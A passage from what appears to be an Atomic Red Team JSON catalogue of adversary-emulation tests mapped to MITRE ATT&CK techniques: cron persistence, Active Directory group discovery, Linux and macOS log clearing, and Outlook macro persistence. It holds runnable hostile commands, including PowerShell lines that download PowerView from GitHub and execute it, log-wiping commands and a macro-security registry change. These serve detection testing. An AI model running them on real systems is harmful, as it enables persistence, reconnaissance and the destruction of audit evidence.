\"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n", "cleanup_command": "crontab /tmp/notevil\n"}}, {"name": "Cron - Add script to all cron subfolders", "auto_generated_guid": "b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0", "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"command": {"description": "Command to execute", "type": "string", "default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"}, "cron_script_name": {"description": "Name of file to store in cron folder", "type": "string", "default": "persistevil"}}, "executor": {"elevation_required": true, "name": "bash", "command": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\necho \"#{command}\" > /etc/cron.hourly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.monthly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.weekly/#{cron_script_name}\n", "cleanup_command": "rm /etc/cron.daily/#{cron_script_name}\nrm /etc/cron.hourly/#{cron_script_name}\nrm /etc/cron.monthly/#{cron_script_name}\nrm /etc/cron.weekly/#{cron_script_name}\n"}}, {"name": "Cron - Add script to /etc/cron.d folder", "auto_generated_guid": "078e69eb-d9fb-450e-b9d0-2e118217c846", "description": "This test adds a script to /etc/cron.d folder configured to execute on a schedule.\n", "supported_platforms": ["linux"], "input_arguments": {"command": {"description": "Command to execute", "type": "string", "default": "echo '*/5     *       *       *       *       root    echo \"Hello from Atomic Red Team\"' > /tmp/atomic.log"}, "cron_script_name": {"description": "Name of file to store in cron folder", "type": "string", "default": "persistevil"}}, "executor": {"elevation_required": true, "name": "sh", "command": "echo \"#{command}\" > /etc/cron.d/#{cron_script_name}\n", "cleanup_command": "rm /etc/cron.d/#{cron_script_name}\n"}}, {"name": "Cron - Add script to /var/spool/cron/crontabs/ folder", "auto_generated_guid": "2d943c18-e74a-44bf-936f-25ade6cccab4", "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "input_arguments": {"command": {"description": "Command to execute", "type": "string", "default": "echo 'Hello from Atomic Red Team' > /tmp/atomic.log"}, "cron_script_name": {"description": "Name of file to store in /var/spool/cron/crontabs folder", "type": "string", "default": "persistevil"}}, "executor": {"elevation_required": true, "name": "bash", "command": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}\n", "cleanup_command": "rm /var/spool/cron/crontabs/#{cron_script_name}\n"}}]}, "T1069.002": {"name": "Domain Groups", "technique_id": "attack-pattern--2aed01ad-3df3-4410-a8cb-11ea4ded587c", "external_id": "T1069.002", "data_components": ["Process Creation", "OS API Execution", "Group Enumeration", "Command Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.", "atomic_tests": [{"name": "Basic Permission Groups Discovery Windows (Domain)", "auto_generated_guid": "dd66d77d-8998-48c0-8024-df263dc2ce5d", "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n", "name": "command_prompt"}}, {"name": "Permission Groups Discovery PowerShell (Domain)", "auto_generated_guid": "6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7", "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"user": {"description": "User to identify what groups a user is a member of", "type": "string", "default": "$env:USERNAME"}}, "executor": {"command": "get-ADPrincipalGroupMembership #{user} | select name\n", "name": "powershell"}}, {"name": "Elevated group enumeration using net group (Domain)", "auto_generated_guid": "0afb5163-8181-432e-9405-4322710c0c37", "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "net groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\nnet group /domai \"Domain Admins\"\n", "name": "command_prompt"}}, {"name": "Find machines where user has local admin access (PowerView)", "auto_generated_guid": "a2d71eee-a353-4232-9f86-54f4288dd8c1", "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n", "name": "powershell"}}, {"name": "Find local admins on all machines in domain (PowerView)", "auto_generated_guid": "a5f0d9f8-d3c9-46c0-8378-846ddd6b1cbd", "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n", "name": "powershell"}}, {"name": "Find Local Admins via Group Policy (PowerView)", "auto_generated_guid": "64fdb43b-5259-467a-b000-1b02c00e510a", "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "hostname of the computer to analyze", "type": "path", "default": "$env:COMPUTERNAME"}}, "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose\"\n", "name": "powershell"}}, {"name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)", "auto_generated_guid": "870ba71e-6858-4f6d-895c-bb6237f6121b", "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined.\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually.\n"}, {"description": "Requires the Active Directory module for powershell to be installed.\n", "prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n", "get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n"}}, {"name": "Adfind - Query Active Directory Groups", "auto_generated_guid": "48ddc687-82af-40b7-8472-ff1e742e8274", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"}], "executor": {"command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group)\n", "name": "command_prompt"}}, {"name": "Enumerate Active Directory Groups with Get-AdGroup", "auto_generated_guid": "3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8", "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "command": "Get-AdGroup -Filter *\n"}}, {"name": "Enumerate Active Directory Groups with ADSISearcher", "auto_generated_guid": "9f4e344b-8434-41b3-85b1-d38f29d148d0", "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n"}}, {"name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)", "auto_generated_guid": "43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8", "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined.\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually.\n"}, {"description": "Requires the Active Directory module for powershell to be installed.\n", "prereq_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n", "get_prereq_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n"}}, {"name": "Get-DomainGroupMember with PowerView", "auto_generated_guid": "46352f40-f283-4fe5-b56d-d9a71750e145", "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n", "name": "powershell"}}, {"name": "Get-DomainGroup with PowerView", "auto_generated_guid": "5a8a181c-2c8e-478d-a943-549305a01230", "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n", "supported_platforms": ["windows"], "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n", "name": "powershell"}}, {"name": "Active Directory Enumeration with LDIFDE", "auto_generated_guid": "22cf8cb9-adb1-4e8c-80ca-7c723dfc8784", "description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n", "supported_platforms": ["windows"], "input_arguments": {"output_path": {"description": "Path to the file that ldifde will output", "type": "path", "default": "C:\\Windows\\temp"}, "output_file": {"description": "The filename to be created by ldifde", "type": "string", "default": "atomic_ldifde.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "PowerShell ActiveDirectory Module must be installed\n", "prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n", "get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"}], "executor": {"elevation_required": true, "command": "ldifde.exe -f #{output_path}\\#{output_file} -p subtree\n", "cleanup_command": "del #{output_path}\\#{output_file}\n", "name": "command_prompt"}}, {"name": "Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS", "auto_generated_guid": "d58d749c-4450-4975-a9e9-8b1d562755c2", "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n", "supported_platforms": ["linux"], "input_arguments": {"domain": {"description": "The domain to be tested", "type": "string", "default": "example"}, "top_level_domain": {"description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)", "type": "string", "default": "com"}, "user": {"description": "username@domain of a user", "type": "string", "default": "user@example.com"}, "password": {"description": "password of the user referenced inside user", "type": "string", "default": "s3CurePssw0rD!"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n", "prereq_command": "which ldapsearch\n", "get_prereq_command": "echo missing ldapsearch command; exit 1\n"}], "executor": {"elevation_required": false, "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n", "name": "sh"}}]}, "T1070.002": {"name": "Clear Linux or Mac System Logs", "technique_id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36", "external_id": "T1070.002", "data_components": ["Command Execution", "File Deletion", "File Modification"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--20a2baeb-98c2-4901-bad7-dc62d0a03dea", "course-of-action--987988f0-cf86-4680-a875-2f6456ab2448", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n", "atomic_tests": [{"name": "rm -rf", "auto_generated_guid": "989cc1b1-3642-4260-a809-54f9dd559683", "description": "Delete system and audit logs\n", "supported_platforms": ["macos", "linux"], "input_arguments": {"syslog_path": {"description": "path of syslog file to delete. On macos it's /var/log/system.log*, on linux, it's /var/log/syslog*. Also note for File events, that on macos, /var/ is a link to /private/var/.", "type": "string", "default": "/var/log/system.log"}, "macos_audit_path": {"description": "path of audit file to delete", "type": "string", "default": "/var/audit/20220725213300.202208110700021"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "if [ -d /var/audit ] ; then stat #{macos_audit_path} ; fi && stat #{syslog_path}\n", "get_prereq_command": "touch #{syslog_path}\nif [ -d /var/audit ] ; then touch #{macos_audit_path} ; fi\n"}], "executor": {"command": "sudo rm -rf #{syslog_path}\nif [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi\n", "name": "sh", "elevation_required": true}}, {"name": "rm -rf", "auto_generated_guid": "bd8ccc45-d632-481e-b7cf-c467627d68f9", "description": "Delete messages and security logs\n", "supported_platforms": ["linux"], "executor": {"command": "rm -rf /var/log/messages\nrm -rf /var/log/security\n", "name": "sh", "elevation_required": true}}, {"name": "Delete log files using built-in log utility", "auto_generated_guid": "653d39cd-bae7-499a-898c-9fb96b8b5cd1", "description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n", "supported_platforms": ["macos"], "executor": {"command": "sudo log erase --all\nsudo log erase --ttl #Deletes only time-to-live log content\n", "name": "sh", "elevation_required": true}}, {"name": "Truncate system log files via truncate utility", "auto_generated_guid": "6290f8a8-8ee9-4661-b9cf-390031bf6973", "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path of system log to delete.", "type": "string", "default": "/var/log/system.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path}\n", "get_prereq_command": "touch #{system_log_path}\n"}], "executor": {"command": "sudo truncate -s 0 #{system_log_path} #size parameter shorthand\nsudo truncate --size=0 #{system_log_path} #size parameter \n", "name": "sh", "elevation_required": true}}, {"name": "Truncate system log files via truncate utility (freebsd)", "auto_generated_guid": "14033063-ee04-4eaf-8f5d-ba07ca7a097c", "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n", "supported_platforms": ["linux"], "executor": {"command": "truncate -s 0 /var/log/messages #size parameter shorthand\ntruncate --size=0 /var/log/security #size parameter \n", "name": "sh", "elevation_required": true}}, {"name": "Delete log files via cat utility by appending /dev/null or /dev/zero", "auto_generated_guid": "c23bdb88-928d-493e-b46d-df2906a50941", "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path of system log to delete.", "type": "string", "default": "/var/log/system.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path}\n", "get_prereq_command": "touch #{system_log_path}\n"}], "executor": {"command": "sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes\nsudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)\n", "name": "sh", "elevation_required": true}}, {"name": "Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)", "auto_generated_guid": "369878c6-fb04-48d6-8fc2-da9d97b3e054", "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n", "supported_platforms": ["linux"], "executor": {"command": "cat /dev/null > /var/log/messages #truncating the file to zero bytes\ncat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)\n", "name": "sh", "elevation_required": true}}, {"name": "System log file deletion via find utility", "auto_generated_guid": "bc8eeb4a-cc3e-45ec-aa6e-41e973da2558", "description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_name1": {"description": "name or prefix of system log to delete.", "type": "string", "default": "system.log"}, "system_log_name2": {"description": "name or prefix of system log to delete.", "type": "string", "default": "system.log.97.gz"}, "system_log_name3": {"description": "name or prefix of system log to delete.", "type": "string", "default": "system.log.98.gz"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}\n", "get_prereq_command": "touch /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}\n"}], "executor": {"command": "sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \\; #using \"rm\" execution\nsudo find /var/log/ -name \"#{system_log_name2}.*\" -exec shred -u -z -n 3 {} \\; #using \"shred\" execution\nsudo find /var/log/ -name \"#{system_log_name3}.*\" -exec unlink {} \\; #using \"unlink\" execution\n", "name": "sh", "elevation_required": true}}, {"name": "Overwrite macOS system log via echo utility", "auto_generated_guid": "0208ea60-98f1-4e8c-8052-930dce8f742c", "description": "This test overwrites the contents of system log file with an empty string using echo utility\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path to system.log", "type": "string", "default": "/var/log/system.log"}}, "executor": {"command": "sudo echo '' > #{system_log_path}\n", "name": "sh", "elevation_required": true}}, {"name": "Overwrite FreeBSD system log via echo utility", "auto_generated_guid": "11cb8ee1-97fb-4960-8587-69b8388ee9d9", "description": "This test overwrites the contents of system log file with an empty string using echo utility\n", "supported_platforms": ["linux"], "executor": {"command": "echo '' > /var/log/messages\n", "name": "sh", "elevation_required": true}}, {"name": "Real-time system log clearance/deletion", "auto_generated_guid": "848e43b3-4c0a-4e4c-b4c9-d1e8cea9651c", "description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n", "supported_platforms": ["macos"], "executor": {"command": "sudo log -f /var/log/system.log | : > /var/log/system.log\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system log files via unlink utility", "auto_generated_guid": "03013b4b-01db-437d-909b-1fdaa5010ee8", "description": "This test deletes the system log file using unlink utility\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path to system.log", "type": "string", "default": "/var/log/system.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path}\n", "get_prereq_command": "touch #{system_log_path}\n"}], "executor": {"command": "sudo unlink #{system_log_path}\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system log files via unlink utility (freebsd)", "auto_generated_guid": "45ad4abd-19bd-4c5f-a687-41f3eee8d8c2", "description": "This test deletes the messages log file using unlink utility\n", "supported_platforms": ["linux"], "executor": {"command": "unlink /var/log/messages\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system log files using shred utility", "auto_generated_guid": "86f0e4d5-3ca7-45fb-829d-4eda32b232bb", "description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path to system.log", "type": "string", "default": "/var/log/system.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path}\n", "get_prereq_command": "touch #{system_log_path}\n"}], "executor": {"command": "sudo shred -u -z -n 3 #{system_log_path}\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system log files using srm utility", "auto_generated_guid": "b0768a5e-0f32-4e75-ae5b-d036edcf96b6", "description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path to system.log", "type": "string", "default": "/var/log/system.log"}, "system_log_folder": {"description": "path to log parent folder", "type": "string", "default": "/var/log/"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path} #{system_log_folder}\n", "get_prereq_command": "mkdir -p #{system_log_folder} && touch #{system_log_path} #{system_log_folder}/system.log\n"}], "executor": {"command": "sudo srm #{system_log_path} #system log file deletion\nsudo srm -r #{system_log_folder} #recursive deletion of log files\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system log files using OSAScript", "auto_generated_guid": "810a465f-cd4f-47bc-b43e-d2de3b033ecc", "description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path to system.log", "type": "string", "default": "/var/log/system.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path}\n", "get_prereq_command": "touch #{system_log_path}\n"}], "executor": {"command": "osascript -e 'do shell script \"rm #{system_log_path}\" with administrator privileges'\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system log files using Applescript", "auto_generated_guid": "e62f8694-cbc7-468f-862c-b10cd07e1757", "description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n", "supported_platforms": ["macos"], "input_arguments": {"system_log_path": {"description": "path to system.log", "type": "string", "default": "/var/log/system.log"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{system_log_path}\n", "get_prereq_command": "touch #{system_log_path}\n"}], "executor": {"command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"#{system_log_path}\"'\n", "name": "sh", "elevation_required": true}}, {"name": "Delete system journal logs via rm and journalctl utilities", "auto_generated_guid": "ca50dd85-81ff-48ca-92e1-61f119cb1dcf", "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n", "supported_platforms": ["linux"], "input_arguments": {"journal_folder": {"description": "path to journal logs", "type": "string", "default": "/var/log/journal"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat #{journal_folder}\n", "get_prereq_command": "mkdir -p #{journal_folder} && touch #{journal_folder}/T1070_002.journal\n"}], "executor": {"command": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n", "name": "sh", "elevation_required": true}}, {"name": "Overwrite Linux Mail Spool", "auto_generated_guid": "1602ff76-ed7f-4c94-b550-2f727b4782d4", "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "input_arguments": {"username": {"description": "Username of mail spool", "type": "string", "default": "root"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "target files must exist\n", "prereq_command": "stat /var/spool/mail/#{username}\n", "get_prereq_command": "touch /var/spool/mail/#{username}\n"}], "executor": {"elevation_required": true, "command": "echo 0> /var/spool/mail/#{username}\n", "name": "bash"}}, {"name": "Overwrite Linux Log", "auto_generated_guid": "d304b2dc-90b4-4465-a650-16ddd503f7b5", "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n", "supported_platforms": ["linux"], "input_arguments": {"log_path": {"description": "Path of specified log", "type": "path", "default": "/var/log/secure"}}, "executor": {"command": "echo 0> #{log_path}\n", "name": "bash", "elevation_required": true, "cleanup_command": "if [ \"/var/log/secure\" != \"#{log_path}\" ] ; then rm -f #{log_path} ; fi\n"}}]}, "T1137": {"name": "Office Application Startup", "technique_id": "attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53", "external_id": "T1137", "data_components": ["File Modification", "Command Execution", "Windows Registry Key Creation", "Module Load", "File Creation", "Windows Registry Key Modification", "Process Creation", "Application Log Content"], "kill_chain_phases": ["persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46", "course-of-action--b5dbb4c5-b0b1-40b1-80b6-e9e84ab90067", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)", "atomic_tests": [{"name": "Office Application Startup - Outlook as a C2", "auto_generated_guid": "bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c", "description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /f >nul 2>&1\ndel %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM >nul 2>&1\n", "name": "command_prompt"}}]}, "T1218.004": {"name": "InstallUtil", 